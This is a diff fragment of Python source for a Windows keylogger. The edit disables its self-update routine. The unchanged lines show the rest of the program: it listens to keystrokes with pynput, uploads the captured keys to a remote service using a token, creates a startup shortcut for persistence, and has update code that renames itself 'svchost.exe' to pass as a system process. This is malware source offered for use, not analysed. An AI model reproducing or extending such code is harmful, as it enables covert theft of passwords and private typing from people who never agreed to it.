@@ -8,7 +8,7 @@ from win32com.client import Dispatch
 from pynput import keyboard
 import ctypes
 import win32process
-from update import *
+"""from update import *"""
 import socket
 
 
@@ -283,7 +283,7 @@ class Keylogger:
         self.connection = Connection(self.loop)
         self.on_ready = self.connection.client.event(self.on_ready)
         self.key_listner = None
-        self.updater = None
+        """self.updater = None"""
         self.write_timer = Timer()
         self.send_timer = Timer()
         self.on_ready = None
@@ -292,14 +292,14 @@ class Keylogger:
     def init(self, token, keys_filepath, write_time):
         self.start_listening(keys_filepath)
         self.init_write_timer(write_time)
-        self.updater = Updater(self.connection, self.info, self.loop)
+        """self.updater = Updater(self.connection, self.info, self.loop)"""
         self.loop.create_task(self.start_connection(token))
 
     async def on_ready(self):
         self.closeable = False
         self.init_send_timer(self.info.send_file_timer)
         await self.upload_keys()
-        await self.updater.update()
+        """await self.updater.update()"""
         self.closeable = True
         await self.close_connection()
 
@@ -374,13 +374,13 @@ class Keylogger:
 
 def main():
     # disable_window()
-    if "update" in sys.argv[1:]:
+    """if "update" in sys.argv[1:]:
         new_name = "svchost.exe"
         time.sleep(2)
         os.remove(new_name)
         time.sleep(2)
         rename_this_file(new_name)
-        print("updated")
+        print("updated")"""
 
     create_shortcut_startup()
     gg = Keylogger()
